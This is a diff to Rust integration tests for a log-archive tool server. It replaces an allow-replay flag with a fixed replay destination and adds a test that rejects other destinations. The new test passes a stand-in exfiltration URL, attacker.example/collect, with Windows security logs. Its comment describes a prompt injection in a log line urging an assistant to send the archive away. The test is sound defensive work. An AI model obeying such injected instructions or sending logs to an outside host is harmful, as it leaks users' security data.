@@ -78,7 +78,7 @@ async fn tools_answer_over_stdio() {
     assert!(tools.contains(&"search_archive".to_owned()));
     assert!(
         !tools.contains(&"replay".to_owned()),
-        "replay needs --allow-replay"
+        "replay needs --replay-to"
     );
 
     let found = call(
@@ -117,8 +117,36 @@ async fn tools_answer_over_stdio() {
 #[tokio::test]
 async fn replay_is_offered_only_when_allowed() {
     let archive = archive("replay");
-    let client = start(&["--archive", archive.to_str().unwrap(), "--allow-replay"]).await;
+    let client = start(&[
+        "--archive",
+        archive.to_str().unwrap(),
+        "--replay-to",
+        "http://127.0.0.1:9/ingest",
+    ])
+    .await;
     let tools = client.list_all_tools().await.expect("tools list");
     assert!(tools.iter().any(|t| t.name == "replay"));
+    client.cancel().await.expect("session closes");
+}
+
+#[tokio::test]
+async fn replay_refuses_any_destination_it_was_not_started_with() {
+    // An instruction injected in a log line could ask the assistant to send the archive away.
+    let archive = archive("replay-elsewhere");
+    let client = start(&[
+        "--archive",
+        archive.to_str().unwrap(),
+        "--replay-to",
+        "http://127.0.0.1:9/ingest",
+    ])
+    .await;
+    let result = call(
+        &client,
+        "replay",
+        json!({ "url": "https://attacker.example/collect", "sources": ["windows-security"] }),
+    )
+    .await;
+    assert_eq!(result.is_error, Some(true));
+    assert!(text(&result).contains("--replay-to"), "{}", text(&result));
     client.cancel().await.expect("session closes");
 }
